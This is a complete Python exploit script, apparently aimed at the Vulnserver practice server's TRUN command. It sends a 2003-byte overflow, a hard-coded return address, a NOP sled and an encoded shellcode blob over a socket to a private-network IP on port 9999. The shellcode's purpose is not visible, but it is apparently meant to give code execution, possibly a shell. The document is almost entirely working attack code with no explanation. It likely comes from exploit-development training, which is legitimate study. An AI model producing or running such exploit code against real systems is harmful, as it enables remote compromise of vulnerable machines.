#!/usr/bin/python3

import sys
import socket

RHOST = '192.168.17.1'
RPORT = 9999

overflow = (
b'\xd9\xce\xbd\x91\x90\xbf\x5d\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1'
b'\x52\x83\xea\xfc\x31\x6a\x13\x03\xfb\x83\x5d\xa8\x07\x4b\x23'
b'\x53\xf7\x8c\x44\xdd\x12\xbd\x44\xb9\x57\xee\x74\xc9\x35\x03'
b'\xfe\x9f\xad\x90\x72\x08\xc2\x11\x38\x6e\xed\xa2\x11\x52\x6c'
b'\x21\x68\x87\x4e\x18\xa3\xda\x8f\x5d\xde\x17\xdd\x36\x94\x8a'
b'\xf1\x33\xe0\x16\x7a\x0f\xe4\x1e\x9f\xd8\x07\x0e\x0e\x52\x5e'
b'\x90\xb1\xb7\xea\x99\xa9\xd4\xd7\x50\x42\x2e\xa3\x62\x82\x7e'
b'\x4c\xc8\xeb\x4e\xbf\x10\x2c\x68\x20\x67\x44\x8a\xdd\x70\x93'
b'\xf0\x39\xf4\x07\x52\xc9\xae\xe3\x62\x1e\x28\x60\x68\xeb\x3e'
b'\x2e\x6d\xea\x93\x45\x89\x67\x12\x89\x1b\x33\x31\x0d\x47\xe7'
b'\x58\x14\x2d\x46\x64\x46\x8e\x37\xc0\x0d\x23\x23\x79\x4c\x2c'
b'\x80\xb0\x6e\xac\x8e\xc3\x1d\x9e\x11\x78\x89\x92\xda\xa6\x4e'
b'\xd4\xf0\x1f\xc0\x2b\xfb\x5f\xc9\xef\xaf\x0f\x61\xd9\xcf\xdb'
b'\x71\xe6\x05\x4b\x21\x48\xf6\x2c\x91\x28\xa6\xc4\xfb\xa6\x99'
b'\xf5\x04\x6d\xb2\x9c\xff\xe6\x7d\xc8\xee\x75\x15\x0b\x10\x6b'
b'\xba\x82\xf6\xe1\x52\xc3\xa1\x9d\xcb\x4e\x39\x3f\x13\x45\x44'
b'\x7f\x9f\x6a\xb9\xce\x68\x06\xa9\xa7\x98\x5d\x93\x6e\xa6\x4b'
b'\xbb\xed\x35\x10\x3b\x7b\x26\x8f\x6c\x2c\x98\xc6\xf8\xc0\x83'
b'\x70\x1e\x19\x55\xba\x9a\xc6\xa6\x45\x23\x8a\x93\x61\x33\x52'
b'\x1b\x2e\x67\x0a\x4a\xf8\xd1\xec\x24\x4a\x8b\xa6\x9b\x04\x5b'
b'\x3e\xd0\x96\x1d\x3f\x3d\x61\xc1\x8e\xe8\x34\xfe\x3f\x7d\xb1'
b'\x87\x5d\x1d\x3e\x52\xe6\x3d\xdd\x76\x13\xd6\x78\x13\x9e\xbb'
b'\x7a\xce\xdd\xc5\xf8\xfa\x9d\x31\xe0\x8f\x98\x7e\xa6\x7c\xd1'
b'\xef\x43\x82\x46\x0f\x46')

nop = b'\x90' * 32

offset = b'A' * 2003 + b'\xaf\x11\x50\x62' + nop + overflow

try:
	payload = b'TRUN /.:/' + offset
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((RHOST,RPORT))
	s.send((payload))
	print('Fuzzing with TRUN command with %s bytes'% str(len(payload)))
	s.close()
except:
	print('error connecting to server')
	sys.exit()
